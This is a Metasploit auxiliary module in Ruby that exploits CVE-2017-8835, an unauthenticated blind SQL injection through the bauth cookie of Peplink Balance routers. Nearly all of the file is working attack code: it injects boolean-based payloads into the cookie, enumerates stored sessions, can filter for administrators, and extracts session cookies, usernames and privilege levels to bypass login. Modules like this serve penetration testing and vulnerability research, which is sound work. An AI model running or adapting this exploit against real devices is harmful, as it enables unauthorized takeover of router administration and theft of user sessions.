class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Peplink Balance routers SQLi',
        'Description' => %q{
          Firmware versions up to 7.0.0-build1904 of Peplink Balance routers are affected by an unauthenticated
          SQL injection vulnerability in the bauth cookie, successful exploitation of the vulnerability allows an
          attacker to retrieve the cookies of authenticated users, bypassing the web portal authentication.

          By default, a session expires 4 hours after login (the setting can be changed by the admin), for this
          reason, the module attempts to retrieve the most recently created sessions.
        },
        'Author' =>
          [
            'X41 D-Sec GmbH <info@x41-dsec.de>', # Original Advisory
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
          ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' =>
          [
            [ 'EDB', '42130' ],
            [ 'CVE', '2017-8835' ],
          ],
        'Targets' => [['Wildcard Target', {}]],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptBool.new('EnumUsernames', [true, 'Retrieve the username associated with each session', false]),
        OptBool.new('EnumPrivs', [true, 'Retrieve the privilege associated with each session', false]),
        OptInt.new('LimitTries', [false, 'The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly', nil]),
        OptBool.new('AdminOnly', [true, 'Only attempt to retrieve cookies of privilegied users (admins)', false])
      ]
    )
  end

  def perform_sqli
    # Note: using run_sql because there is a limit on the length of our queries
    # will work only if we remove the casts, NULL value handling etc.
    digit_range = ('0'..'9')
    bit_range = ('0'..'1')
    alphanumeric_range = ('0'..'z')
    session_count = @sqli.run_sql("select count(1) from sessionsvariables where name='expire'").to_i
    print_status "There are #{session_count} (possibly expired) sessions"

    # limit the number of session cookies to retrieve if the option is set
    session_count = datastore['LimitTries'] if datastore['LimitTries'] && datastore['LimitTries'] < session_count

    session_ids = session_count.times.map do |i|
      id = @sqli.run_sql('select id from sessionsvariables ' \
                    "where name='expire' order by " \
                    "cast(value as int) desc limit 1 offset #{i}", output_charset: digit_range).to_i
      # if AdminOnly, check if is an admin
      if datastore['AdminOnly']
        is_rwa = @sqli.run_sql("select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'", output_charset: bit_range).to_i
        is_rwa > 0 ? id : nil
      else
        id
      end
    end.compact

    print_status("After filtering out non-admin sessions: #{session_ids.count} sessions remain") if datastore['AdminOnly']

    if session_ids.count == 0
      print_error('No active authenticated sessions found, try again after a user has authenticated')
      return
    end

    print_status('Trying the ids from the most recent login')

    session_ids.each_with_index do |id, idx|
      cookie = @sqli.run_sql("select sessionid from sessions where id=#{id}", output_charset: alphanumeric_range)
      if datastore['EnumUsernames']
        username = @sqli.run_sql("select value from sessionsvariables where name='username' and id=#{id}")
      end

      if datastore['EnumPrivs']
        is_rwa = @sqli.run_sql("select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'", output_charset: bit_range).to_i
      end
      username_msg = username ? ", username = #{username}" : ''
      is_admin_msg = is_rwa ? ", with #{is_rwa > 0 ? 'read/write' : 'read-only'} permissions" : ''
      print_good "Found cookie #{cookie}#{username_msg}#{is_admin_msg}"
      break if session_count == idx + 1
    end
  end

  def run
    @sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'admin.cgi'),
        'method' => 'GET',
        'cookie' => "bauth=' or #{payload}--"
      })
      fail_with 'Unable to connect to target' unless res
      !res.headers['Set-Cookie'] # no Set-Cookie header means the session cookie is valid
    end
    if @sqli.test_vulnerable
      print_good 'Target seems vulnerable'
    else
      fail_with 'Target does not seem to be vulnerable'
    end
    perform_sqli
  end
end
